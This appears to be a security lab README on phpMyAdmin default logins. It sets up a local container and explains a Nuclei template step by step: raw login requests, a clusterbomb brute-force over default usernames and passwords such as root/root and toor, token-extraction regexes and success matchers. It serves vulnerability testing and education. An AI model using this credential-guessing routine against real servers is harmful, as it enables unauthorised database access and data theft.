# phpMyAdmin Default Login

## Description  

phpMyAdmin configured with default or weak credentials pose a critical security risk. Attackers can exploit this vulnerability to gain  access sensitive information, manipulate databases, extract sensitive information, and execute arbitrary SQL commands.

## References  

- [Sling Academy - Default phpMyAdmin Credentials](https://www.slingacademy.com/article/default-username-and-password-for-phpmyadmin/)  
- [phpMyAdmin Default Credentials List](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/mysql-betterdefaultpasslist.txt) 

## Lab Setup  

- Run the following command to build and start the container:

  ```bash
  docker-compose up -d
  ```
Once running, **phpMyAdmin** will be accessible on **port 8080** with the default credentials:(`root`:`root`)
  
## Exploitation Steps  
- Navigate to phpMyAdmin at: http://your-ip:8080
- Enter the default credentials (`root/root`).
![img](https://github.com/user-attachments/assets/bb4e46f8-53d7-4f0e-8a8f-653328d641fe)

- Successfully log in to phpMyAdmin.
![img](https://github.com/user-attachments/assets/afcab5c4-f934-4691-8ea4-ba6685238682)


## Steps to Write Nuclei Template  


**HTTP Requests**
```yaml
http:
  - raw:
      - |
        GET /index.php HTTP/1.1
        Host: {{Hostname}}
      - |
        POST /index.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Cookie: phpMyAdmin={{token2}}; pma_lang=en

        set_session={{session}}&pma_username={{user}}&pma_password={{password}}&server=1&route=%2F&token={{token}}
```
- The **first request** (`GET /index.php`) checks if phpMyAdmin is running.
- The **second request** (`POST /index.php`) attempts to log in using **different credentials**.
- It sends **username (`pma_username`) and password (`pma_password`)** in an HTTP POST request.



**Attack Mode**
```yaml
    attack: clusterbomb
```
- **Clusterbomb mode**: Tests **all** possible **username & password** combinations.



**Payloads**
```yaml
    payloads:
      user:
        - root
        - mysql
      password:
        - 123456
        - root
        - mysql
        - toor
```

- These are **common default credentials** tested against phpMyAdmin.
- It tries **every username with every password**.



**Extracting Tokens (Extractors)**
```yaml
    extractors:
      - type: regex
        name: token
        internal: true
        group: 1
        regex:
          - 'name="token" value="([0-9a-z]+)"'
```

- Extracts **token** needed for authentication.


```yaml
      - type: regex
        name: token2
        internal: true
        group: 1
        regex:
          - 'name="set_session" value="([0-9a-z]+)"'
```

- Extracts **session token** required for a valid login request.


```yaml
      - type: regex
        name: session
        part: header
        internal: true
        group: 2
        regex:
          - "phpMyAdmin(_https)?=([0-9a-z]+)" # for HTTPS
```

- Extracts **session ID** from the response headers.



**Stop Execution on First Match**
```yaml
    stop-at-first-match: true
```

- Stops testing as soon as **valid credentials** are found.



**Matchers (Detecting Successful Login)**
```yaml
    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - contains(header_2, "phpMyAdmin=") && contains(header_2, "pmaUser-1=")
          - status_code_2 == 302
          - contains(header_2, 'index.php?collation_connection=utf8mb4_unicode_ci') || contains(header_2, '/index.php?route=/&route=%2F')
        condition: and
```

- Confirms a **successful login** by checking:
  - **Response headers** contain a phpMyAdmin session.
  - **Status code is `302`** (redirect after successful login).
  - **Response contains dashboard-related URLs (`index.php?route=/`)**.

## Nuclei Template URL : [phpmyadmin-default-login](https://github.com/projectdiscovery/nuclei-templates/blob/main/http/default-logins/phpmyadmin/phpmyadmin-default-login.yaml)

## Nuclei Command  

```bash
nuclei -id phpmyadmin-default-login -u localhost:8080 -vv
```
![img](https://github.com/user-attachments/assets/779b2f98-19f4-4008-80e6-d475f9effab9)
